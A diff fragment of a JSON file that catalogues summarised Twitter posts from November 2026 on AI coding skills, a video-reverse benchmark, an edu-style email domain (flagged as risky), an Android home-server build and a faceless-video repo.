+    "summary": "Use no-refusal models only for authorised testing. Treat the nodecode claims about privacy and price as unverified.",
+    "productLinks": [
+      "https://nodecode.ai/",
+      "https://github.com/nodecode-ai/nodecode",
+      "https://x.com/painn_x/status/2118645833759379667"
+    ],
+    "topicTags": [
+      "bug-bounty",
+      "minimax",
+      "deepseek",
+      "abliterated",
+      "opencode"
+    ],
+    "worthFollowUp": "low",
+    "hasMedia": "",
+    "relatedUrls": [
+      "https://x.com/painn_x/status/2118645833759379667"
+    ]
+  },
+  {
+    "uid": "X-426",
+    "platform": "Twitter",
+    "category": "AI & LLM",
+    "subcategory": "Reverse-engineering skills",
+    "title": "HyperFrames claims its reverse-any-video skill is 20x faster than REA-Video",
+    "author": "James Russo",
+    "date": "2026-11-09",
+    "url": "https://x.com/Rames_Jusso/status/2122465287354409304",
+    "engagement": "67 replies · 188 reposts · 3.2K likes · 5.4K bookmarks · 153.2K views",
+    "essence": "Rames Jusso of HyperFrames compares its reverse-any-video skill with REA-Video, the skill in the quoted Riley Brown post, where Claude downloads a YouTube video and analyses every frame to extract the editing style. The post claims 81 seconds against 1,595 seconds, about 20x faster, and a similarity score (SSIM) of 0.96 against 0.78. Install with npx skills add heygen-com/hyperframes. Replies in the thread say it works best with Opus 5.5 or Fable 5.2 and works inside Grok bot. Other readers ask for the repo link, which model to use, and whether 8 GB of RAM is enough. This is the vendor's own benchmark. See X-254.",
+    "summary": "A useful pair of skills to compare. Run both on one video before you trust the benchmark.",
+    "productLinks": [
+      "https://github.com/heygen-com/hyperframes"
+    ],
+    "topicTags": [
+      "hyperframes",
+      "reverse-engineering",
+      "video",
+      "skills",
+      "ssim"
+    ],
+    "worthFollowUp": "medium",
+    "hasMedia": "video"
+  },
+  {
+    "uid": "X-427",
+    "platform": "Twitter",
+    "category": "Dev Tools & Productivity",
+    "subcategory": "Claude Code skills",
+    "title": "shadcn's /improve skill: use the best model to audit and write plans for cheaper models",
+    "author": "shadcn",
+    "date": "2026-11-09",
+    "url": "https://x.com/shadcn/status/2119879610724720702",
+    "engagement": "71 replies · 96 reposts · 2.9K likes · 3.1K bookmarks · 184.1K views",
+    "essence": "Shadcn says to run /improve with Fable 5.2, because it found results that Opus 5.5 missed. The repo (shadcn/improve) describes the idea: use your most capable model to audit your codebase and write plans that cheaper models execute. The post quotes the 10 Nov launch of Claude Fable 5.2 and Mythos 5.2. Replies say Opus missed an issue and /improve caught it, and several readers installed it. One joke says token use needs improving too. See X-224 and X-297.",
+    "summary": "A cheap way to use a strong model once and weaker models many times. Run it on one repo and compare the plans with your own review.",
+    "productLinks": [
+      "https://github.com/shadcn/improve"
+    ],
+    "topicTags": [
+      "improve",
+      "skills",
+      "fable-5-2",
+      "planning",
+      "audit"
+    ],
+    "worthFollowUp": "high",
+    "hasMedia": "video"
+  },
+  {
+    "uid": "X-428",
+    "platform": "Twitter",
+    "category": "Other",
+    "subcategory": "Student email caution",
+    "title": "A free edu-style email at mail.flame.edu.kg, with an invite code: treat with care",
+    "author": "Nico爱分享",
+    "date": "2026-11-08",
+    "url": "https://x.com/Nico69Oliveira/status/2119347566316019958",
+    "engagement": "80 replies · 156 reposts · 2.7K likes · 5.5K bookmarks · 233K views",
+    "essence": "Nico posts mail.flame.edu.kg, which offers a free student-style email address valid until 2083 with no student ID. The first invite code was Happy November 11th. Later posts in the thread give new codes (Snowden, FREESnowden) and admit the domain is a Kyrgyzstan education domain. Replies are mixed. One user got an address, but a site did not accept it as a university address. Others say the invite code expired, or ask how to use it for education benefits when a form asks for a university name. This looks like a way around student verification, and many programs ban such use.",
+    "summary": "Do not rely on it for student perks, because services check eligibility and can close accounts. Use a real student status.",
+    "productLinks": [
+      "https://mail.flame.edu.kg/"
+    ],
+    "topicTags": [
+      "edu-email",
+      "student-perks",
+      "invite-code",
+      "risk",
+      "free"
+    ],
+    "worthFollowUp": "low",
+    "hasMedia": "image"
+  },
+  {
+    "uid": "X-429",
+    "platform": "Twitter",
+    "category": "Dev Tools & Productivity",
+    "subcategory": "Homelab",
+    "title": "An old Android phone as a 24/7 home server: Nextcloud, Pi-hole and Navidrome at 2 to 3 W",
+    "author": "Md Ismail Šojal 🕷️",
+    "date": "2026-11-07",
+    "url": "https://x.com/0x0SojalSec/status/2119100186874306652",
+    "engagement": "57 replies · 176 reposts · 2.7K likes · 2.5K bookmarks · 154.7K views",
+    "essence": "Md Ismail Sojal turned a cheap old Android phone into a home server that runs Nextcloud, Pi-hole, Navidrome music streaming and a live status dashboard. It draws 2 to 3 W on battery with the screen off, using a Debian 13 chroot and Magisk, with no extra hardware. His thread links a Reddit homelab post about a similar Xiaomi Redmi 10C build. Replies raise battery risk. One says to cap charge at 80%, and another had a swollen battery after 2 weeks plugged in. One reply says to drop Android for mainline Linux with postmarketOS or Alpine and links a Kubernetes cluster write-up. Others ask about external storage and the dashboard app.",
+    "summary": "A fun low-power project. Limit the battery charge or remove the battery before you run it 24/7.",
+    "productLinks": [
+      "https://blog.denv.it/posts/pmos-k3s-cluster/"
+    ],
+    "topicTags": [
+      "homelab",
+      "android",
+      "nextcloud",
+      "pi-hole",
+      "magisk"
+    ],
+    "worthFollowUp": "medium",
+    "hasMedia": "image"
+  },
+  {
+    "uid": "X-430",
+    "platform": "Twitter",
+    "category": "AI & LLM",
+    "subcategory": "Video generation",
+    "title": "stickman-video-director: a free repo that turns a script into faceless YouTube videos",
+    "author": "Bankai Sauce",
+    "date": "2026-11-06",
+    "url": "https://x.com/gremlin0x/status/2118648972135039134",
+    "engagement": "153 replies · 44 reposts · 759 likes · 780 bookmarks · 30.9K views",
+    "essence": "Bankai Sauce offers a repo for faceless YouTube channels that he says removes 90% of production issues for short, long and ultra-long videos. The repo, kaomei/stickman-video-director, turns a script into animated stickman videos and automates visuals, voiceover, captions and sound effects. It is free and open source. In his thread he says any art style works if you give a reference, because the point is to copy the workflow. He says Codex is best because it has unlimited image generation, and Claude can assemble the video if you make the images elsewhere. Most replies ask for the link or say his DMs are closed.",
+    "summary": "The workflow matters more than the stickman style. Faceless channels depend on platform policy for AI content.",
+    "productLinks": [
+      "https://github.com/kaomei/stickman-video-director"
+    ],
+    "topicTags": [
+      "youtube",
+      "stickman",
+      "video-generation",
+      "workflow",
+      "faceless"
+    ],
+    "worthFollowUp": "low",
+    "hasMedia": ""
   }
 ]
